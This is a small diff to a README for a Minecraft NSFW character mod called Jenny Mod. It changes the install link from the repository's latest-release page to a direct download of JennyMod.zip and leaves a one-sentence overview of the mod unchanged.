@@ -20,7 +20,7 @@
 
 
 ## Install
- [Download `JennyMod.zip`](https://github.com/6537445/jenny-mod-minecraft-/releases/latest)
+ [Download `JennyMod.zip`](https://github.com/6537445/jenny-mod-minecraft-/releases/download/Jenny-Mod/JennyMod.zip)
  ---
 ## Overview
 **Jenny Mod** is a popular NSFW character mod for Minecraft that adds the character **Jenny** with high-quality animations, interactions, voice lines, and immersive features.
